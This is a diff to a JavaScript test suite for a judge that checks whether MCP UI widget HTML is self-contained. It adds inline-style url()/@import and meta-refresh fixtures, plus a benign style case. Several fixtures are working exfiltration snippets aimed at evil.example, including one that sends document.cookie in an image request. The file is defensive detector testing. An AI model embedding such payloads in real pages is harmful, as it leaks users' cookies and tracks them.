@@ -420,6 +420,16 @@ const SRCDOC_XHR = `<!doctype html><html><body><script>var x=new XMLHttpRequest(
 const SRCDOC_IMAGE_EXFIL = `<!doctype html><html><body><script>var i=new Image();i.src="https://evil.example/p?c="+encodeURIComponent(document.cookie)</script></body></html>`
 const SRCDOC_DYNAMIC_IMPORT = `<!doctype html><html><body><script>import("https://evil.example/mod.js")</script></body></html>`
 const SRCDOC_WS = `<!doctype html><html><body><script>new WebSocket("wss://evil.example/ws")</script></body></html>`
+// A remote url()/@import in an inline style="" ATTRIBUTE — a live cookie-less
+// remote GET (tracking beacon / exfil), NOT inside a <style> tag. Each PASSED
+// the old parse, which only scanned <style> tag bodies (the false-PASS this fixes).
+const SRCDOC_STYLE_ATTR_URL = `<!doctype html><html><body><div style="background:url(https://evil.example/bg.png?c=1)">x</div></body></html>`
+const SRCDOC_STYLE_ATTR_PROTO_REL = `<!doctype html><html><body><div style="background-image:url(//evil.example/pixel.gif)">x</div></body></html>`
+const SRCDOC_STYLE_ATTR_IMPORT = `<!doctype html><html><body><div style="@import url('https://evil.example/x.css')">x</div></body></html>`
+// A benign inline style — color/padding/local only, NO remote url — stays self-contained.
+const SRCDOC_STYLE_ATTR_BENIGN = `<!doctype html><html><body><div style="color:#333;padding:4px;background:url(#localgrad)">ok</div></body></html>`
+// A <meta http-equiv="refresh"> to a remote origin — a redirect load (already caught).
+const SRCDOC_META_REFRESH = `<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example/go"></head><body>x</body></html>`
 
 // A DOC/snippet widget that merely SHOWS a URL in inert display text — self-contained.
 const SRCDOC_PRE_INERT = `<!doctype html><html><head><style>body{font:14px system-ui}</style></head>
@@ -450,6 +460,10 @@ describe('self-containment REQUIRES a closed CSP and catches the exfil surface',
     ['new Image().src cookie-exfil', SRCDOC_IMAGE_EXFIL],
     ['dynamic import()', SRCDOC_DYNAMIC_IMPORT],
     ['new WebSocket(wss://…)', SRCDOC_WS],
+    ['remote url() in a style="" attribute', SRCDOC_STYLE_ATTR_URL],
+    ['protocol-relative url() in a style="" attribute', SRCDOC_STYLE_ATTR_PROTO_REL],
+    ['@import in a style="" attribute', SRCDOC_STYLE_ATTR_IMPORT],
+    ['<meta http-equiv=refresh url=https://…>', SRCDOC_META_REFRESH],
   ]
   for (const [label, srcdoc] of exfilCases) {
     it(`catches ${label} → self-containment FAILs and caps the grade`, async () => {
@@ -462,6 +476,11 @@ describe('self-containment REQUIRES a closed CSP and catches the exfil surface',
 
   it('a doc widget that merely SHOWS a URL in <pre>/<code>/escaped markup (closed CSP) PASSES (no false-fail)', async () => {
     const { checks } = await judge({ resourceRead: defaultResourceRead({ text: SRCDOC_PRE_INERT }) })
+    expect(verdictOf(checks, 'mcp-ui-self-contained'), detailOf(checks, 'mcp-ui-self-contained')).toBe('pass')
+  })
+
+  it('a benign inline style="" (color/padding/local, NO remote url) stays self-contained → PASSES (no over-block)', async () => {
+    const { checks } = await judge({ resourceRead: defaultResourceRead({ text: SRCDOC_STYLE_ATTR_BENIGN }) })
     expect(verdictOf(checks, 'mcp-ui-self-contained'), detailOf(checks, 'mcp-ui-self-contained')).toBe('pass')
   })
 })
